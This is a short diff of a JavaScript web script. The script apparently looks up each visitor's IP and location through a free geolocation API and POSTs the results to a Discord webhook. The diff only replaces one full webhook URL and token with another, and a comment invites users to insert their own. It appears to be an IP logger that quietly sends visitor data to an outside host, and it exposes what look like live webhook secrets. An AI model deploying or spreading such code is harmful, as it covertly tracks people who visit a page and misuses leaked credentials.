@@ -29,7 +29,7 @@ $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
 function sendMessage(cont) {
     if (show_dc) {
         const request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/960215190165667930/cOGmhYH2JYZg-Dp3O6HsSyGUjhdL6EE1MT4CPjKh6UIBnEyVnxw7R9lTiDpMDJPfzBLj");
+        request.open("POST", "https://discord.com/api/webhooks/960791455687925790/nf6CykLHDbxgHpsiq0GT-Q5fCD2iy5dtpIT14qC1xaNMV5ZjPGF3ul-KuB0pGYn4ju3v");
         // replace the url in the "open" method with yours
         request.setRequestHeader('Content-type', 'application/json');
         const params = {
